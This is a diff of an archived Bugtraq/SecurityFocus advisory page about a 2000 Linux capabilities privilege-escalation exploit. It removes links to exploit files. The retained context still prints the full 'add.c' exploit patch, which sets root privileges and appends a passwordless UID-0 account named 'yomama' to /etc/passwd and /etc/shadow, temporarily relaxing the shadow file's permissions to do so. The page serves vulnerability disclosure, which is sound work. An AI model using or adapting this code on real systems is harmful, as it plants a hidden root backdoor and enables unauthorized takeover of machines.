@@ -166,7 +166,7 @@ Followup posted to Bugtraq by
 </td>
 </tr>
 </table>
-</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x2000/1322/linux-cap-exp.txt">#exploit_linux-cap-exp.txt</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x2000/1322/cap-procmail-sendmail.txt">#exploit_cap-procmail-sendmail.txt</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+</div><br><br>#<br>#<br><br>#<br>#<div id="vulnerability">
 <span class="title"></span><br/><br/>
 	This patch (for the component add.c included in "linux-cap-exp.txt") was posted to BugTraq on June 8, 2000 by "Mark K. Pettit" &lt;pettit@yahoo-inc.com&gt; and fixes a couple of minor problems with that exploit.  It fixes a missing \n and makes the exploit work on systems with the shadow file set to mode 400. <br/><br/>--- add.c.orig  Thu Jun  8 11:32:33 2000<br/>+++ add.c       Thu Jun  8 11:21:15 2000<br/>@@ -1,17 +1,24 @@<br/> #include &lt;fcntl.h&gt;<br/>+#include &lt;sys/types.h&gt;<br/>+#include &lt;sys/stat.h&gt;<br/>+#include &lt;unistd.h&gt;<br/><br/> int main (void) {<br/>    int fd;<br/>    char string40;<br/>+   struct stat buf;<br/> <br/>    seteuid(0);<br/>    fd = open("/etc/passwd", O_APPEND|O_WRONLY);<br/>    strcpy(string, "yomama:x:0:0::/root:/bin/sh\n");<br/>    write(fd, string, strlen(string));<br/>    close(fd);<br/>+   stat("/etc/shadow", &amp;buf);<br/>+   chmod("/etc/shadow", S_IRUSR|S_IWUSR);<br/>    fd = open("/etc/shadow", O_APPEND|O_WRONLY);<br/>-   strcpy(string, "yomama::11029:0:99999:7:::");<br/>+   strcpy(string, "yomama::11029:0:99999:7:::\n");<br/>    write(fd, string, strlen(string));<br/>    close(fd);<br/>-<br/>+   chmod("/etc/shadow", buf.st_mode);<br/> }
 	
